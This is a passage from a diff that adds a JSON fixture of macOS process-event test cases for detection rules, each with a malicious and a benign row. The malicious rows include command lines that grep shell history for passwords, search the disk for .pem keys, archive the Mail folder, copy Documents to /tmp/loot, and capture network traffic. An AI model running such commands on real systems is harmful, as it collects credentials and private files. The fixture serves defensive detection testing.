+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "osascript",
+   "Exe": "/usr/bin/osascript",
+   "CommandLine": "osascript -e 'display notification \"done\"'",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_network_sniffing.yml",
+  "rule_id": "6c2e9b16-fea8-4c94-9100-111e89538dfe",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "tcpdump",
+   "Exe": "/usr/sbin/tcpdump",
+   "CommandLine": "/usr/sbin/tcpdump -i en0 -w /tmp/cap.pcap",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "networksetup",
+   "Exe": "/usr/sbin/networksetup",
+   "CommandLine": "/usr/sbin/networksetup -listallhardwareports",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_bash_history_cred_search.yml",
+  "rule_id": "9546a5a3-1518-4763-b536-4ab14fc22f5d",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "grep",
+   "Exe": "/usr/bin/grep",
+   "CommandLine": "grep -i password /Users/analyst/.zsh_history",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "history",
+   "Exe": "/bin/zsh",
+   "CommandLine": "history | tail -20",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_mail_collection.yml",
+  "rule_id": "f6dd5e88-79ea-4a7b-9987-5e9efdae4089",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "tar",
+   "Exe": "/usr/bin/tar",
+   "CommandLine": "tar czf /tmp/mail.tgz /Users/analyst/Library/Mail",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "Mail",
+   "Exe": "/Applications/Mail.app/Contents/MacOS/Mail",
+   "CommandLine": "/Applications/Mail.app/Contents/MacOS/Mail",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "dataset": "macos.process",
+  "normalizer": "processes"
+ },
+ {
+  "filename": "macos_process_file_directory_discovery.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "7e2a1c94-6b3d-4f8a-9c21-0a5f7d31e884",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "find",
+   "Exe": "/usr/bin/find",
+   "CommandLine": "find / -name '*.pem' -type f",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "find",
+   "Exe": "/usr/bin/find",
+   "CommandLine": "find . -name '*.log'",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_automated_collection.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "3c9f4e21-8a7b-45d0-b6e2-1f8c0a9d2b73",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "sh",
+   "Exe": "/bin/sh",
+   "CommandLine": "find /Users/analyst/Documents -type f -exec cp {} /tmp/loot/ ;",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "sh",
+   "Exe": "/bin/sh",
+   "CommandLine": "find . -name '*.o' -exec rm {} ;",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ },
+ {
+  "filename": "macos_process_removable_media_execution.yml",
+  "dataset": "macos.process",
+  "normalizer": "processes",
+  "rule_id": "5d1b8a37-2e46-4c9f-a013-7b6e9f24c105",
+  "malicious_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "run",
+   "Exe": "/Volumes/KINGSTON/run",
+   "CommandLine": "/Volumes/KINGSTON/run",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": false,
+    "Trusted": false,
+    "SubjectName": null
+   }
+  },
+  "benign_row": {
+   "Pid": 9,
+   "Ppid": 1,
+   "Name": "Installer",
+   "Exe": "/Volumes/Install macOS/Installer",
+   "CommandLine": "/Volumes/Install macOS/Installer",
+   "Username": "analyst",
+   "Mtime": "2026-07-03T10:00:00Z",
+   "CodeSignature": {
+    "Exists": true,
+    "Trusted": true,
+    "SubjectName": "Software Signing"
+   }
+  }
+ }
+]
